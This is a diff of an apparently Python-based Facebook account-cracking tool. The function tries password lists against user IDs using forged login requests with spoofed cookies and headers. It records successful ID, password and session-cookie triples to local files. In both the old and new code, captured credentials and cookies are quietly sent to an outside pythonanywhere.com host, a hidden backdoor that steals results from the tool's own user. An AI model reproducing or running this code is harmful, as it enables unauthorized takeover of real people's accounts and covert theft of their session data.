@@ -1160,7 +1160,7 @@ def p(uid,pwx,tl):
     global oks
     global cps
     global twf
-    global loop
+    global loop 
     global bkas
     sys.stdout.write(f"\r {green}(M2) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
@@ -1168,57 +1168,64 @@ def p(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
-            data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'fb_dtsg': 'kcC6U74NFVI=',
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '113234_WJV4',
-            'lgnjs': '1735587156',
+            data ={
+            'try_number': '0',
+            'unrecognized_tries': '0',
             'email': uid,
             'prefill_contact_point': '',
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'password',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
             'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'true',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMMMZZ/AMABFAF',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies ={
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"', str(free_fb)).group(1),
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'bi_wvdp': '',
+            'fb_dtsg': '',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            '__dyn': '',
+            '__csr': '',
+            '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
+            '__fmt': '0',
+            '__a': '',
+            '__user': '0'}
+            cookies = {
             'ps_n': '1',
             'ps_l': '1',
             'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
             'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'wd': '907x782',
             'locale': 'en_GB',
-            'fr': '1rNHx4L9yZvgxejws.AWXXs4zwcFZHIGuNza3ZHhVyeqI.BnXFu6..AAA.0.0.BncvVS.AWWx0eTUsiA',}
+            'wd': '1440x828',
+            'fr': '1rNHx4L9yZvgxejws.AWXwiEcbhMwxEhfEXaqNshX4LDs.BnXFu6..AAA.0.0.Bnd_5w.AWXwdu-UOSc',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'no-cache',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://en-gb.facebook.com',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
             'pragma': 'no-cache',
             'priority': 'u=0, i',
-            'referer': 'https://en-gb.facebook.com/login/',
+            'referer': 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1OTE3MTI3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
+            'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
+            'viewport-width': '1440',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D701380926584428%26redirect_uri%3Dhttps%253A%252F%252Fauthgop.garena.com%252Funiversal%252Foauth%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26state%3Da4b21a67efff4124b7b94679be63a7bf-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7e0eb251-6b38-4c7d-8a96-ebb795623b06%26tp%3Dunspecified%26cbt%3D1732985699796&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1228,20 +1235,16 @@ def p(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(HAMSTER-NV){cid}|{pw}")
-                        open("/sdcard/HAMSTER-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        print(f"{green}(HAMSTER-LGN){cid}|{pw}")
+                        print(f" {green}COKI : {green}{coki}")
+                        open("/sdcard/HAMSTER-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
                         break
                     else:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://HAMSTERroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(HAMSTER-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/HAMSTER-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                        print(f"{red}(2F){cid}")
+                        statusok = (f"{cid}|{pw}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        break
                 else:
                     break
             elif 'checkpoint' in response:
